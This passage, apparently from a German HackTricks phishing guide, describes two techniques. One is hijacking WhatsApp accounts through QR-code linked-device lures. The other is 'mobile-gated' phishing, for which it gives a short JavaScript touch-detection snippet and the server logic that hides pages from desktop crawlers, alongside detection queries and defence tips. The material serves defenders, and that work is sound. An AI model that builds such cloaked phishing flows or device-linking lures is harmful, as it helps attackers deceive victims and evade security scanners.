* Eine Lockseite (z. B. ein gefälschter Ministry/CERT-“channel”) zeigt einen WhatsApp Web/Desktop QR-Code an und weist das Opfer an, ihn zu scannen, wodurch der Angreifer heimlich als **linked device** hinzugefügt wird.
* Der Angreifer erhält sofort Chat-/Kontakt-Sichtbarkeit, bis die Session entfernt wird. Opfer sehen später möglicherweise eine Benachrichtigung über ein „new device linked“; Verteidiger können nach unerwarteten device-link events kurz nach Besuchen auf nicht vertrauenswürdigen QR-Seiten suchen.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatoren schirmen ihre phishing-Flows zunehmend mit einer einfachen Geräteprüfung ab, damit Desktop-Crawler nie die finalen Seiten erreichen. Ein übliches Muster ist ein kleines Script, das auf ein touch-fähiges DOM prüft und das Ergebnis an einen Server-Endpoint sendet; nicht-mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobile Nutzer den vollständigen Flow sehen.

Minimaler Client-Snippet (typische Logik):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` Logik (vereinfacht):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server-Verhalten oft beobachtet:
- Setzt beim ersten Laden ein Session-Cookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei anschließenden GETs 500 (oder Platzhalter) zurück, wenn `is_mobile=false`; liefert Phishing nur bei `true` aus.

Hunting- und Detection-Heuristiken:
- urlscan-Query: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Sequenz `GET /static/detect_device.js` → `POST /detect` → HTTP 500 für non-mobile; legitime mobile Victim-Pfade geben 200 mit nachfolgendem HTML/JS zurück.
- Seiten blockieren oder besonders prüfen, die Inhalte ausschließlich auf `ontouchstart` oder ähnliche Device-Checks stützen.

Defence-Tipps:
- Crawler mit mobile-ähnlichen Fingerprints und aktiviertem JS ausführen, um gated content offenzulegen.
- Auf verdächtige 500-Antworten nach `POST /detect` auf neu registrierten Domains alerten.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
